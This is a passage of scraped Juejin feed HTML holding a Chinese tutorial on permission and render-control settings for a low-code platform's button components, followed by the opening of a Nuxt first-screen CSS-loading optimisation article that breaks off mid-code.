      <span class="hljs-attr">is</span>: <span class="hljs-string">'lc-button'</span>,
      <span class="hljs-attr">_type</span>: <span class="hljs-string">'danger'</span>,
      <span class="hljs-attr">control</span>: {
        <span class="hljs-attr">code</span>: <span class="hljs-string">'delete'</span>
      },
      <span class="hljs-attr">default</span>: [{
        <span class="hljs-attr">is</span>: <span class="hljs-string">'lc-text'</span>,
        <span class="hljs-attr">default</span>: <span class="hljs-string">'删除'</span>
      }]
    }],
    <span class="hljs-attr">_span</span>: <span class="hljs-number">24</span>
  }]
}]
</code></pre>
<p>上面展示的是数据视图的代码形式，我们在设计的时候直接通过属性配置的方式进行设置即可</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ebd51acdc30e4ea195faf6a365a3a823~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm06Jm5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768543530&amp;x-signature=SQlyyDuTov6wEIqgVXiPsbPAn8o%3D" alt="配置control" loading="lazy"/></p>
<p>这时新增按钮通过 <code>add</code> 标识来控制，删除按钮通过 <code>delete</code> 标识来控制，现在我们去掉删除按钮的权限</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/61f9b1f4eb874bf2a519432a129e2f59~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm06Jm5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768543530&amp;x-signature=oEJ04bnRRWatfpEATu1aVZ5kq14%3D" alt="只有新增code" loading="lazy"/></p>
<p>那么页面上就没有了删除按钮</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/33ee15a3c39946c78dc3d0c9355066cb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm06Jm5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768543530&amp;x-signature=1ag%2Bx%2FTMvAsk1Vsm9lPJW3l1JDU%3D" alt="只有新增按钮" loading="lazy"/></p>
<p><code>requestData.code</code> 对象除了可以设置权限标识为 <code>true</code> 或 <code>false</code> 之外，还能够设置为权限对象</p>
<p>比如可以设置成这样</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/41842c88388a475e95b3a1fa5c22aa8c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm06Jm5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768543530&amp;x-signature=aRg1OcSoUe3NhvDE%2FpRf77ozjYE%3D" alt="设置为权限对象" loading="lazy"/></p>
<p>我们设置了一个 <code>pageButton</code> 的权限对象，里面包含了 <code>add</code> 和 <code>delete</code> 的控制</p>
<p>然后修改一下这两个按钮的 <code>control</code> 配置</p>
<pre><code class="hljs language-js" lang="js">[{
  <span class="hljs-attr">col</span>: [{
    <span class="hljs-attr">default</span>: [{
      <span class="hljs-attr">is</span>: <span class="hljs-string">'lc-button'</span>,
      <span class="hljs-attr">control</span>: {
        <span class="hljs-attr">code</span>: <span class="hljs-string">'pageButton.add'</span>
      },
      <span class="hljs-attr">default</span>: [{
        <span class="hljs-attr">is</span>: <span class="hljs-string">'lc-text'</span>,
        <span class="hljs-attr">default</span>: <span class="hljs-string">'新增'</span>
      }]
    }, {
      <span class="hljs-attr">is</span>: <span class="hljs-string">'lc-button'</span>,
      <span class="hljs-attr">control</span>: {
        <span class="hljs-attr">code</span>: <span class="hljs-string">'pageButton.delete'</span>
      },
      <span class="hljs-attr">_type</span>: <span class="hljs-string">'danger'</span>,
      <span class="hljs-attr">default</span>: [{
        <span class="hljs-attr">is</span>: <span class="hljs-string">'lc-text'</span>,
        <span class="hljs-attr">default</span>: <span class="hljs-string">'删除'</span>
      }]
    }],
    <span class="hljs-attr">_span</span>: <span class="hljs-number">24</span>
  }]
}]
</code></pre>
<p>这样页面上就只剩删除按钮了</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/90aa8901de284a9e8c4b258aaa94e579~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm06Jm5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768543530&amp;x-signature=fEGLxVVxQH2Ja2Xxxa0gSXwv%2BzI%3D" alt="只有删除按钮" loading="lazy"/></p>
<p>对象的层级没有限制，也就是说可以任意的制定权限控制的规则和分类等。比如 <code>pageButton.add.enable</code>，只要属性值为逻辑true即可</p>
<h3 data-id="heading-2">permission</h3>
<p>用户在登录成功之后，会获取到配置的对应身份组 <code>identity</code>，我们可以为 <code>permission</code> 字段设定具有一个或多个值的权限组，</p>
<p>如果 <code>permission</code> 中的至少一个字段能够在 <code>identity</code> 中找到，那么就会进行渲染，否则直接跳过该组件。</p>
<p>还是使用上面的例子，这次我们用 <code>permission</code> 字段来控制按钮的权限</p>
<pre><code class="hljs language-js" lang="js">[{
  <span class="hljs-attr">col</span>: [{
    <span class="hljs-attr">default</span>: [{
      <span class="hljs-attr">is</span>: <span class="hljs-string">'lc-button'</span>,
      <span class="hljs-attr">control</span>: {
        <span class="hljs-attr">permission</span>: [<span class="hljs-string">'roleA'</span>, <span class="hljs-string">'roleC'</span>]
      },
      <span class="hljs-attr">default</span>: [{
        <span class="hljs-attr">is</span>: <span class="hljs-string">'lc-text'</span>,
        <span class="hljs-attr">default</span>: <span class="hljs-string">'新增'</span>
      }]
    }, {
      <span class="hljs-attr">is</span>: <span class="hljs-string">'lc-button'</span>,
      <span class="hljs-attr">_type</span>: <span class="hljs-string">'danger'</span>,
      <span class="hljs-attr">control</span>: {
        <span class="hljs-attr">permission</span>: [<span class="hljs-string">'roleB'</span>]
      },
      <span class="hljs-attr">default</span>: [{
        <span class="hljs-attr">is</span>: <span class="hljs-string">'lc-text'</span>,
        <span class="hljs-attr">default</span>: <span class="hljs-string">'删除'</span>
      }]
    }],
    <span class="hljs-attr">_span</span>: <span class="hljs-number">24</span>
  }]
}]
</code></pre>
<p>然后给我们的 <code>identity</code> 赋值上相应的身份标识</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/573cf64cc7fb471f9a899683f0ad242a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm06Jm5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768543530&amp;x-signature=at2BwPftVJjuqnz4%2BDmAYyDyc8E%3D" alt="identity赋值" loading="lazy"/></p>
<p>当前用户具有 <code>roleA</code>、<code>roleB</code>、<code>roleC</code> 三个身份，因此两个按钮都能够渲染出来</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6493b34180af445e8e5b7742608a6e99~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm06Jm5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768543530&amp;x-signature=%2FBMar9ka2oCVYXQhv%2FNc%2F7om22o%3D" alt="新增和删除按钮" loading="lazy"/></p>
<p>当我们去掉 <code>roleA</code>、<code>roleB</code> 两个身份时</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d97495d9f208408b9740760c31fd7615~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm06Jm5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768543530&amp;x-signature=Wn4qO5F5a%2BBrQP%2B8EluH5yceyZ8%3D" alt="只有roleC身份" loading="lazy"/></p>
<p>相应的按钮权限也会实时生效</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d2badd0a9ab747cab8b9adfec817248d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm06Jm5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768543530&amp;x-signature=afXsdm0MAdWFknex0fpgUUY81EI%3D" alt="只有新增按钮" loading="lazy"/></p>
<h3 data-id="heading-3">noPermission</h3>
<p>我们可以为 <code>noPermission</code> 字段设定具有一个或多个值的无权限组，如果 <code>noPermission</code> 中的至少一个字段能够在身份组 <code>identity</code> 中找到，那么就表示该角色无权渲染该组件，将会直接跳过，否则一个都未找到的话，那么才会进行渲染。</p>
<p>同样，我们将上面配置的 <code>permission</code> 改为 <code>noPermission</code></p>
<pre><code class="hljs language-js" lang="js">[{
  <span class="hljs-attr">col</span>: [{
    <span class="hljs-attr">default</span>: [{
      <span class="hljs-attr">is</span>: <span class="hljs-string">'lc-button'</span>,
      <span class="hljs-attr">control</span>: {
        <span class="hljs-attr">noPermission</span>: [<span class="hljs-string">'roleA'</span>, <span class="hljs-string">'roleC'</span>]
      },
      <span class="hljs-attr">default</span>: [{
        <span class="hljs-attr">is</span>: <span class="hljs-string">'lc-text'</span>,
        <span class="hljs-attr">default</span>: <span class="hljs-string">'新增'</span>
      }]
    }, {
      <span class="hljs-attr">is</span>: <span class="hljs-string">'lc-button'</span>,
      <span class="hljs-attr">_type</span>: <span class="hljs-string">'danger'</span>,
      <span class="hljs-attr">control</span>: {
        <span class="hljs-attr">noPermission</span>: [<span class="hljs-string">'roleB'</span>]
      },
      <span class="hljs-attr">default</span>: [{
        <span class="hljs-attr">is</span>: <span class="hljs-string">'lc-text'</span>,
        <span class="hljs-attr">default</span>: <span class="hljs-string">'删除'</span>
      }]
    }],
    <span class="hljs-attr">_span</span>: <span class="hljs-number">24</span>
  }]
}]
</code></pre>
<p>这时用户只有 <code>roleC</code> 这一个身份，那么将只会渲染删除按钮，因为 <code>roleC</code> 身份没有新增按钮的权限</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ed3c765520a340e1a287cb2d7d187ba0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm06Jm5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768543530&amp;x-signature=6yVCLMwhQPtQM%2FjXpoGM3Jy5jas%3D" alt="只有删除按钮" loading="lazy"/></p>
<h3 data-id="heading-4">if</h3>
<p>如果需要手动的去做判断，那么可以使用 <code>if</code> 字段，它的值是一个函数。</p>
<p>可以在函数内部执行某些逻辑，函数体内可以通过this获取到暴露出来的属性和方法等。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/07f607866df54f07824b4118dd67d9f3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm06Jm5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768543530&amp;x-signature=yUyq0RRx6sUn4zJZwYXwMOxRs9U%3D" alt="if能获取的变量" loading="lazy"/></p>
<p>然后手动指定返回值为 <code>true</code> 或者 <code>false</code></p>
<p>如果 <code>if</code> 返回为 <code>false</code>，将会跳过该数据视图的渲染，如果返回为true，那么表示有权限，则会进行渲染。</p>
<pre><code class="hljs language-js" lang="js">[{
  <span class="hljs-attr">col</span>: [{
    <span class="hljs-attr">default</span>: [{
      <span class="hljs-attr">is</span>: <span class="hljs-string">'lc-button'</span>,
      <span class="hljs-attr">control</span>: {
        <span class="hljs-attr">if</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
          <span class="hljs-comment">// 这里是一些逻辑</span>
          <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>
        }
      },
      <span class="hljs-attr">default</span>: [{
        <span class="hljs-attr">is</span>: <span class="hljs-string">'lc-text'</span>,
        <span class="hljs-attr">default</span>: <span class="hljs-string">'新增'</span>
      }]
    }, {
      <span class="hljs-attr">is</span>: <span class="hljs-string">'lc-button'</span>,
      <span class="hljs-attr">_type</span>: <span class="hljs-string">'danger'</span>,
      <span class="hljs-attr">control</span>: {
        <span class="hljs-attr">if</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
          <span class="hljs-comment">// 这里是一些逻辑</span>
          <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>
        }
      },
      <span class="hljs-attr">default</span>: [{
        <span class="hljs-attr">is</span>: <span class="hljs-string">'lc-text'</span>,
        <span class="hljs-attr">default</span>: <span class="hljs-string">'删除'</span>
      }]
    }],
    <span class="hljs-attr">_span</span>: <span class="hljs-number">24</span>
  }]
}]
</code></pre>
<p>此时只会渲染返回值为 <code>true</code> 的组件</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/372fd48db62e4ae98417132ff2632766~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm06Jm5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768543530&amp;x-signature=mmYzm1zIOfQ%2FQBy4Fmg03%2BfUnAo%3D" alt="只有新增按钮" loading="lazy"/></p>
<h3 data-id="heading-5">call</h3>
<p>当数据视图渲染完成之后，将会调用 <code>call</code> 对应的函数。同样在 <code>call</code> 的函数体内可以通过 <code>this</code> 获取到相应的变量和方法，并可额外通过$el获取到渲染完成的页面中对应的元素，可以进行一些处理操作，不需要返回值。</p>
<p>比如我们通过 <code>describe</code> 对象给新增按钮换一个类型，然后通过 <code>$el</code> 给删除按钮修改一下字体的大小</p>
<pre><code class="hljs language-js" lang="js">[{
  <span class="hljs-attr">col</span>: [{
    <span class="hljs-attr">default</span>: [{
      <span class="hljs-attr">is</span>: <span class="hljs-string">'lc-button'</span>,
      <span class="hljs-attr">control</span>: {
        <span class="hljs-attr">call</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
          <span class="hljs-comment">// 这里是一些逻辑</span>
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">describe</span>.<span class="hljs-property">_type</span> = <span class="hljs-string">'primary'</span>
        }
      },
      <span class="hljs-attr">default</span>: [{
        <span class="hljs-attr">is</span>: <span class="hljs-string">'lc-text'</span>,
        <span class="hljs-attr">default</span>: <span class="hljs-string">'新增'</span>
      }]
    }, {
      <span class="hljs-attr">is</span>: <span class="hljs-string">'lc-button'</span>,
      <span class="hljs-attr">_type</span>: <span class="hljs-string">'danger'</span>,
      <span class="hljs-attr">control</span>: {
        <span class="hljs-attr">call</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
          <span class="hljs-comment">// 这里是一些逻辑</span>
          <span class="hljs-keyword">let</span> el = <span class="hljs-variable language_">this</span>.<span class="hljs-property">$el</span>.<span class="hljs-property">ref</span>
          el.<span class="hljs-property">style</span>.<span class="hljs-property">fontSize</span> = <span class="hljs-string">'18px'</span>
        }
      },
      <span class="hljs-attr">default</span>: [{
        <span class="hljs-attr">is</span>: <span class="hljs-string">'lc-text'</span>,
        <span class="hljs-attr">default</span>: <span class="hljs-string">'删除'</span>
      }]
    }],
    <span class="hljs-attr">_span</span>: <span class="hljs-number">24</span>
  }]
}]
</code></pre>
<p>这样就可以做到在组件渲染完成之后进行任意的处理</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/536ed39e9ca44bcfba020a1ef6df5992~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm06Jm5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768543530&amp;x-signature=7%2B5RSGV1SryEhVR6FWRwmt9QZMc%3D" alt="通过call处理" loading="lazy"/></p>
<h3 data-id="heading-6">dom</h3>
<p>根据设定的 <code>dom</code> 字段的值，当元素渲染完成后，可以通过 <code>controlData</code> 对象来访问对应的元素，如设定为 <code>button_add</code>，那么访问形式就可以这样写：<code>controlData.button_addDom</code>，就得到了对页面元素的引用。</p>
<pre><code class="hljs language-js" lang="js">[{
  <span class="hljs-attr">col</span>: [{
    <span class="hljs-attr">default</span>: [{
      <span class="hljs-attr">is</span>: <span class="hljs-string">'lc-button'</span>,
      <span class="hljs-attr">control</span>: {
        <span class="hljs-attr">dom</span>: <span class="hljs-string">'button_add'</span>
      },
      <span class="hljs-attr">default</span>: [{
        <span class="hljs-attr">is</span>: <span class="hljs-string">'lc-text'</span>,
        <span class="hljs-attr">default</span>: <span class="hljs-string">'新增'</span>
      }]
    }, {
      <span class="hljs-attr">is</span>: <span class="hljs-string">'lc-button'</span>,
      <span class="hljs-attr">_type</span>: <span class="hljs-string">'danger'</span>,
      <span class="hljs-attr">control</span>: {
        <span class="hljs-attr">dom</span>: <span class="hljs-string">'button_delete'</span>
      },
      <span class="hljs-attr">default</span>: [{
        <span class="hljs-attr">is</span>: <span class="hljs-string">'lc-text'</span>,
        <span class="hljs-attr">default</span>: <span class="hljs-string">'删除'</span>
      }]
    }],
    <span class="hljs-attr">_span</span>: <span class="hljs-number">24</span>
  }]
}]
</code></pre>
<p>新增和删除按钮的dom引用就被添加到了 <code>controlData</code> 对象中</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2b7a79ab14d54543a2da5c295af3221d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm06Jm5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768543530&amp;x-signature=2sl1qJidCT2rKHku4SkC%2BJ8n110%3D" alt="dom引用" loading="lazy"/></p>
<h3 data-id="heading-7">view</h3>
<p>根据设定的 <code>view</code> 字段的值，当元素渲染完成后，可以通过 <code>controlData</code> 对象来访问对应的视图，如设定为 <code>button_add</code>，那么访问形式就可以这样写：<code>controlData.button_addView</code>，就得到了对该视图的引用。</p>
<pre><code class="hljs language-js" lang="js">[{
  <span class="hljs-attr">col</span>: [{
    <span class="hljs-attr">default</span>: [{
      <span class="hljs-attr">is</span>: <span class="hljs-string">'lc-button'</span>,
      <span class="hljs-attr">control</span>: {
        <span class="hljs-attr">view</span>: <span class="hljs-string">'button_add'</span>
      },
      <span class="hljs-attr">default</span>: [{
        <span class="hljs-attr">is</span>: <span class="hljs-string">'lc-text'</span>,
        <span class="hljs-attr">default</span>: <span class="hljs-string">'新增'</span>
      }]
    }, {
      <span class="hljs-attr">is</span>: <span class="hljs-string">'lc-button'</span>,
      <span class="hljs-attr">_type</span>: <span class="hljs-string">'danger'</span>,
      <span class="hljs-attr">control</span>: {
        <span class="hljs-attr">view</span>: <span class="hljs-string">'button_delete'</span>
      },
      <span class="hljs-attr">default</span>: [{
        <span class="hljs-attr">is</span>: <span class="hljs-string">'lc-text'</span>,
        <span class="hljs-attr">default</span>: <span class="hljs-string">'删除'</span>
      }]
    }],
    <span class="hljs-attr">_span</span>: <span class="hljs-number">24</span>
  }]
}]
</code></pre>
<p>新增和删除按钮的视图引用就被添加到了 <code>controlData</code> 对象中</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dd2975878d0a4a3fbe49eecac0bf30b4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm06Jm5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768543530&amp;x-signature=EBOZUUd6iGFnfe33YA5mW%2BPshQE%3D" alt="view引用" loading="lazy"/></p>
<p>可以看到除了dom和view的引用被添加到了 <code>controlData</code> 对象中外，还有一个以DT结尾的对象引用也被添加到了 <code>controlData</code> 对象中。</p>
<p>dom和view需要手动指定后才会被收集到 <code>controlData</code> 对象中，所有被命名的数据视图都会自动的被收集到 <code>controlData</code> 对象中，并以DT结尾来标识</p>
<blockquote>
<p>提示：</p>
<p><code>code</code>、<code>permission</code>、<code>noPermission</code>、<code>if</code> 可以同时存在，但是他们之间有一个优先级的关系，因此设置的时候尽量不要冲突，如 <code>permission</code> 设定为 <code>[roleA]</code>，<code>noPermission</code> 也设定为 <code>[roleA]</code>，那么 <code>noPermission</code> 将不会生效。</p>
<p>他们之间的优先级关系为：
<code>code &gt; permission &gt; noPermission &gt; if</code>，当设定产生冲突时，将会按照这个优先级进行处理。</p>
</blockquote>
<p>注意 <code>permission</code>、<code>noPermission</code> 必须要设定为数组的形式，不支持字符串的设定。</p>
<p><code>dom</code> 和 <code>view</code> 字段都是字符串，他们不做任何逻辑处理，只是保留了元素和视图的引用，以备在其他地方引用。</p>
<p>【项目体验】</p>
<p><a href="https://link.juejin.cn?target=http%3A%2F%2Fwww.lecen.top%2Fmanage" target="_blank" title="http://www.lecen.top/manage" ref="nofollow noopener noreferrer">系统管理端地址</a> ：<a href="https://link.juejin.cn?target=http%3A%2F%2Fwww.lecen.top%2Fmanage" target="_blank" title="http://www.lecen.top/manage" ref="nofollow noopener noreferrer">www.lecen.top/manage</a></p>
<p><a href="https://link.juejin.cn?target=http%3A%2F%2Fwww.liudaxianer.com%2Fuser" target="_blank" title="http://www.liudaxianer.com/user" ref="nofollow noopener noreferrer">系统用户端地址</a> ：<a href="https://link.juejin.cn?target=http%3A%2F%2Fwww.liudaxianer.com%2Fuser" target="_blank" title="http://www.liudaxianer.com/user" ref="nofollow noopener noreferrer">www.liudaxianer.com/user</a></p>
<p><a href="https://link.juejin.cn?target=http%3A%2F%2Fwww.lnsstyp.com%2Fweb" target="_blank" title="http://www.lnsstyp.com/web" ref="nofollow noopener noreferrer">系统文档地址</a> ：<a href="https://link.juejin.cn?target=http%3A%2F%2Fwww.lnsstyp.com%2Fweb" target="_blank" title="http://www.lnsstyp.com/web" ref="nofollow noopener noreferrer">www.lnsstyp.com/web</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[前端首屏渲染性能优化小技巧]]></title>    <link>https://juejin.cn/post/7592887786966695972</link>    <guid>https://juejin.cn/post/7592887786966695972</guid>    <pubDate>2026-01-09T06:07:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592887786966695972" data-draft-id="7592912896592150547" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="前端首屏渲染性能优化小技巧"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-09T06:07:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="不会写前端的小丁"/> <meta itemprop="url" content="https://juejin.cn/user/3690398224757118"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            前端首屏渲染性能优化小技巧
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3690398224757118/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    不会写前端的小丁
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T06:07:20.000Z" title="Fri Jan 09 2026 06:07:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>`
export default defineNuxtPlugin(() =&gt; {
if (process.client) {
const optimizeCSSLoading = () =&gt; {
const links = Array.from(document.querySelectorAll('link[rel="stylesheet"]')) as HTMLLinkElement[]</p>
<pre><code class="hljs language-javascript" lang="javascript">  links.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">link</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> href = link.<span class="hljs-title function_">getAttribute</span>(<span class="hljs-string">'href'</span>)
    <span class="hljs-keyword">if</span> (!href) <span class="hljs-keyword">return</span>
    
